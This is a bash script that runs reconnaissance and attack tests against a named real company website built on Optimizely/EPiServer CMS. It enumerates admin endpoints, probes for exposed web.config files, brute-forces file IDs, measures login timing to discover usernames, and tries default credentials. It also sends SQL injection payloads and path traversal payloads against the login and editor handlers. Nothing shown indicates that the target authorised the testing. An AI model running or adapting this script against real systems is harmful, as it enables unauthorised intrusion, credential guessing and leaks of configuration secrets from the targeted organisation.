#!/bin/bash
# Optimizely CMS (EPiServer) Reconnaissance & Vulnerability Testing
# Target: www.dnv.com

TARGET="https://www.dnv.com"
LOGIN_URL="https://www.dnv.com/util/login"

echo "=========================================="
echo "  Optimizely CMS Security Assessment"
echo "  Target: $TARGET"
echo "=========================================="

# 1. Version Fingerprinting
echo -e "\n[1] VERSION FINGERPRINTING"
echo "================================"

echo -e "\n[1.1] Checking EPiServer/Optimizely headers..."
curl -s -I "$TARGET" | grep -i "episerver\|optimizely\|x-powered-by\|x-aspnet\|x-aspnetmvc"

echo -e "\n[1.2] Checking login page for version info..."
curl -s "$LOGIN_URL" | grep -i -E "(episerver|optimizely|version|cms|\.0\.|\.dll)" | head -20

echo -e "\n[1.3] Checking JavaScript files for version..."
JS_FILES=$(curl -s "$TARGET" | grep -o 'src="[^"]*\.js"' | cut -d'"' -f2 | head -10)
for js in $JS_FILES; do
    if [[ $js == //* ]]; then
        js="https:$js"
    elif [[ $js == /* ]]; then
        js="$TARGET$js"
    fi
    echo "Checking: $js"
    curl -s "$js" | grep -i -E "(episerver|optimizely|version)" | head -3
done

echo -e "\n[1.4] Checking for version disclosure files..."
VERSION_FILES=(
    "/episerver/cms/admin"
    "/episerver/cms/version"
    "/util/version"
    "/EPiServer/CMS/Admin/default.aspx"
    "/episerver/cms"
    "/Util/javascript/system.js"
    "/App_Data/EPiServerVersion.txt"
)

for file in "${VERSION_FILES[@]}"; do
    echo "Testing: $file"
    curl -s -o /dev/null -w "  HTTP: %{http_code}\n" "$TARGET$file"
done

# 2. Common Optimizely/EPiServer Endpoints
echo -e "\n[2] ENDPOINT ENUMERATION"
echo "================================"

ENDPOINTS=(
    "/episerver/cms/admin"
    "/episerver/cms/admin/login.aspx"
    "/EPiServer/CMS/Admin"
    "/util/login"
    "/util/login.aspx"
    "/util/logout"
    "/Util/Editor/DialogHandler.ashx"
    "/WebServices/PageTreeService.asmx"
    "/api/episerver"
    "/api/optimizely"
    "/episerver/api"
    "/EPiServer.Labs.BlockEnhancements"
    "/episerver/shell"
    "/episerver/cms/Stores"
    "/EPiServer/Shell/CMS/Content"
    "/util/xmlrpc"
    "/WebResource.axd"
    "/ScriptResource.axd"
    "/EPiServer/CMS/VisitorGroups"
)

for endpoint in "${ENDPOINTS[@]}"; do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint")
    if [ "$HTTP_CODE" != "404" ]; then
        echo "  ✓ $endpoint → HTTP $HTTP_CODE"
    fi
done

# 3. Information Disclosure
echo -e "\n[3] INFORMATION DISCLOSURE TESTING"
echo "================================"

echo -e "\n[3.1] Checking for exposed configuration..."
CONFIG_FILES=(
    "/web.config"
    "/Web.config"
    "/web.config.bak"
    "/episerver.config"
    "/EPiServerLog.config"
    "/App_Data/web.config"
)

for file in "${CONFIG_FILES[@]}"; do
    RESPONSE=$(curl -s "$TARGET$file" -w "\n__HTTP__:%{http_code}")
    HTTP=$(echo "$RESPONSE" | grep "__HTTP__" | cut -d: -f2)
    if [ "$HTTP" == "200" ]; then
        echo "  🔥 $file → HTTP 200"
        echo "$RESPONSE" | grep -i "connection\|password\|database\|key" | head -5
    fi
done

echo -e "\n[3.2] Checking error disclosure..."
curl -s "$TARGET/nonexistent%27%22%3Cscript%3E.aspx" | grep -i "server error\|stack trace\|episerver\|version" | head -10

# 4. Media/File IDOR
echo -e "\n[4] TESTING FILE/MEDIA ACCESS (IDOR)"
echo "================================"

echo "Testing media file access patterns..."
MEDIA_PATTERNS=(
    "/globalassets"
    "/Global/Documents"
    "/Global/Media"
    "/contentassets"
    "/siteassets"
    "/episerver/cms/content"
)

for pattern in "${MEDIA_PATTERNS[@]}"; do
    echo "  Testing: $pattern"
    RESPONSE=$(curl -s "$TARGET$pattern" -w "\n__HTTP__:%{http_code}")
    HTTP=$(echo "$RESPONSE" | grep "__HTTP__" | cut -d: -f2)
    echo "    HTTP: $HTTP"

    # Check if directory listing is enabled
    if echo "$RESPONSE" | grep -q "Index of\|Directory Listing"; then
        echo "    🔥 DIRECTORY LISTING ENABLED!"
    fi
done

# Test specific file IDs
echo -e "\n  Testing file ID enumeration..."
for id in $(seq 1 50); do
    HTTP=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/globalassets/$id")
    if [ "$HTTP" == "200" ]; then
        echo "    ✓ File ID $id accessible"
    fi
done

# 5. API Endpoints
echo -e "\n[5] TESTING API ENDPOINTS"
echo "================================"

API_ENDPOINTS=(
    "/api/episerver/v2.0"
    "/api/episerver/v3.0"
    "/ContentDeliveryApi"
    "/api/episerver/commerce"
    "/api/episerver/forms"
    "/api/episerver/mail"
    "/episerver/api/commerce"
    "/EPiServer.Forms/DataSubmit"
)

for api in "${API_ENDPOINTS[@]}"; do
    RESPONSE=$(curl -s "$TARGET$api" -w "\n__HTTP__:%{http_code}")
    HTTP=$(echo "$RESPONSE" | grep "__HTTP__" | cut -d: -f2)
    if [ "$HTTP" != "404" ]; then
        echo "  ✓ $api → HTTP $HTTP"
        echo "$RESPONSE" | head -10
    fi
done

# 6. User Enumeration
echo -e "\n[6] USER ENUMERATION"
echo "================================"

echo "Testing user enumeration on login..."
# Get ViewState and other form fields
LOGIN_PAGE=$(curl -s "$LOGIN_URL")
VIEWSTATE=$(echo "$LOGIN_PAGE" | grep -o '__VIEWSTATE" value="[^"]*"' | cut -d'"' -f4 | head -1)
EVENTVALIDATION=$(echo "$LOGIN_PAGE" | grep -o '__EVENTVALIDATION" value="[^"]*"' | cut -d'"' -f4 | head -1)

echo "ViewState: ${VIEWSTATE:0:50}..."

# Test timing attack
echo -e "\n  Testing timing-based user enumeration..."
USERS=("admin" "administrator" "episerver" "sysadmin" "nonexistent12345")

for user in "${USERS[@]}"; do
    START=$(date +%s%N)
    curl -s -X POST "$LOGIN_URL" \
        -d "username=${user}&password=wrongpass&__VIEWSTATE=${VIEWSTATE}&__EVENTVALIDATION=${EVENTVALIDATION}" \
        -o /dev/null
    END=$(date +%s%N)
    TIME=$(((END - START) / 1000000))
    echo "  User '$user': ${TIME}ms"
done

# 7. WebDAV Testing
echo -e "\n[7] WEBDAV TESTING"
echo "================================"

WEBDAV_PATHS=(
    "/WebDAV"
    "/util/WebDAV"
    "/EPiServer/WebDAV"
)

for path in "${WEBDAV_PATHS[@]}"; do
    echo "Testing: $path"
    curl -s -X OPTIONS "$TARGET$path" -I | grep -i "allow\|dav\|ms-author-via"
done

# 8. Default Credentials
echo -e "\n[8] TESTING DEFAULT CREDENTIALS"
echo "================================"

echo "Common Optimizely/EPiServer default credentials:"
echo "  - admin / store (old versions)"
echo "  - administrator / password"
echo "  - episerver / episerver"

echo -e "\nAttempting login with default credentials..."
DEFAULT_CREDS=(
    "admin:store"
    "administrator:password"
    "episerver:episerver"
    "admin:admin"
)

for cred in "${DEFAULT_CREDS[@]}"; do
    USER=$(echo $cred | cut -d: -f1)
    PASS=$(echo $cred | cut -d: -f2)
    echo "  Testing: $USER:$PASS"

    RESPONSE=$(curl -s -X POST "$LOGIN_URL" \
        -d "username=${USER}&password=${PASS}&__VIEWSTATE=${VIEWSTATE}" \
        -c /tmp/optimizely_cookies.txt \
        -w "\n__HTTP__:%{http_code}")

    HTTP=$(echo "$RESPONSE" | grep "__HTTP__" | cut -d: -f2)

    # Check if login successful
    if echo "$RESPONSE" | grep -q "dashboard\|cms\|admin" && ! echo "$RESPONSE" | grep -q "login\|error"; then
        echo "    🔥 POTENTIAL SUCCESSFUL LOGIN!"
    else
        echo "    HTTP: $HTTP (failed)"
    fi
done

# 9. SQL Injection Points
echo -e "\n[9] SQL INJECTION TESTING"
echo "================================"

echo "Testing login for SQL injection..."
SQLI_PAYLOADS=(
    "admin'--"
    "admin' OR '1'='1"
    "' OR 1=1--"
)

for payload in "${SQLI_PAYLOADS[@]}"; do
    echo "  Payload: $payload"
    RESPONSE=$(curl -s -X POST "$LOGIN_URL" \
        -d "username=${payload}&password=test&__VIEWSTATE=${VIEWSTATE}" \
        2>&1)

    if echo "$RESPONSE" | grep -i "sql\|syntax\|database\|exception"; then
        echo "    🔥 POTENTIAL SQL ERROR!"
        echo "$RESPONSE" | grep -i "sql\|syntax" | head -3
    fi
done

# 10. Path Traversal
echo -e "\n[10] PATH TRAVERSAL TESTING"
echo "================================"

TRAVERSAL_PAYLOADS=(
    "../../../../web.config"
    "..%2F..%2F..%2F..%2Fweb.config"
    "....//....//....//web.config"
)

TRAVERSAL_ENDPOINTS=(
    "/util/Editor/DialogHandler.ashx?path="
    "/EPiServer/CMS/Content?path="
    "/globalassets/"
)

for endpoint in "${TRAVERSAL_ENDPOINTS[@]}"; do
    for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
        echo "Testing: $endpoint$payload"
        RESPONSE=$(curl -s "$TARGET$endpoint$payload")
        if echo "$RESPONSE" | grep -q "connectionString\|appSettings\|configuration"; then
            echo "  🔥 POTENTIAL PATH TRAVERSAL!"
        fi
    done
done

echo -e "\n=========================================="
echo "  RECONNAISSANCE COMPLETE"
echo "=========================================="
echo ""
echo "Next steps:"
echo "  1. Identify exact version"
echo "  2. Search for version-specific CVEs"
echo "  3. Test authenticated features if credentials found"
echo "  4. Check for exposed sensitive files"
